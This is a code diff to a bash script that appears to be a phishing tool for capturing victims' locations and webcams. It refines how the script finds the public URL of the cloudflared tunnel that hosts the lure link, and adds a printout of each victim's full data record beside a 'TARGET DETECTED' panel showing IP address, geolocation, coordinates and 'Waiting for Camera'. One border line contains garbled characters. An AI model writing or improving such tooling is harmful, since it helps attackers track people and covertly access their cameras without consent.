@@ -57,8 +57,16 @@ try_cloudflared() {
 	while [[ $elapsed -lt 8 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
-		# cloudflared prints the public url in logs
-		local url=$(grep -o "https://[a-z0-9.-]*" cloudflared.log | head -n1 || true)
+		# cloudflared prints the public url in logs - look for the actual tunnel URL
+		local url=$(grep -oP 'https://[a-z0-9\-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
+		if [[ -z "$url" ]]; then
+			# Alternative pattern for cloudflared output
+			url=$(grep -oP 'https://[a-z0-9\-]+\.cloudflare\.com' cloudflared.log | grep -v 'www.cloudflare.com' | head -n1 || true)
+		fi
+		if [[ -z "$url" ]]; then
+			# Look for any https URL that's not the main cloudflare site
+			url=$(grep -oP 'https://[a-z0-9\-\.]+' cloudflared.log | grep -v 'www.cloudflare.com' | grep -v 'cloudflare.com/cdn-cgi' | head -n1 || true)
+		fi
 		if [[ -n "$url" ]]; then
 			printf "\e[1;92m[✓] cloudflared ready: $url\e[0m\n"
 			echo "$url"
@@ -67,6 +75,10 @@ try_cloudflared() {
 	done
 
 	printf "\e[1;93m[!] cloudflared timeout or failed\e[0m\n"
+	if [[ -s cloudflared.log ]]; then
+		printf "\e[1;93m[DEBUG] cloudflared output:\e[0m\n"
+		tail -5 cloudflared.log | sed 's/^/    /'
+	fi
 	kill $cf_pid 2>/dev/null || true
 	return 1
 }
@@ -360,7 +372,7 @@ catch_ip() {
 		if [[ -n "$ip" ]]; then
 			printf "\n\e[1;92m╔════════════════════════════════════════════════════════════════════╗\e[0m\n"
 			printf "\e[1;92m║\e[0m\e[1;77m                      ✅ TARGET DETECTED ✅                      \e[0m\e[1;92m║\e[0m\n"
-			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
+			printf "\e[1;92m╠════════════════════���═══════════════════════════════════════════════╣\e[0m\n"
 			printf "\e[1;92m║\e[0m  \e[1;93m[+] IP ADDRESS: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$ip"
 			printf "\e[1;92m║\e[0m  \e[1;93m[+] GEOLOCATION: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$geo"
 			printf "\e[1;92m║\e[0m  \e[1;93m[+] COORDINATES: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$coords"
@@ -375,6 +387,13 @@ catch_ip() {
 			printf "\e[1;92m║\e[0m  \e[1;93m[+] Timestamp: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$(date '+%Y-%m-%d %H:%M:%S')"
 			printf "\e[1;92m║\e[0m  \e[1;93m[+] Status: \e[1;77mLink Opened - Waiting for Camera\e[0m\e[1;92m║\e[0m\n"
 			printf "\e[1;92m╚════════════════════════════════════════════════════════════════════╝\e[0m\n"
+			
+			# Display full JSON data for complete information
+			printf "\n\e[1;92m[📋] Full Target Data (JSON):\e[0m\n"
+			if [[ -f "ip.json" ]]; then
+				tail -1 ip.json | python3 -m json.tool 2>/dev/null || tail -1 ip.json
+			fi
+			
 			cat ip.txt >> saved.ip.txt
 		fi
 	fi
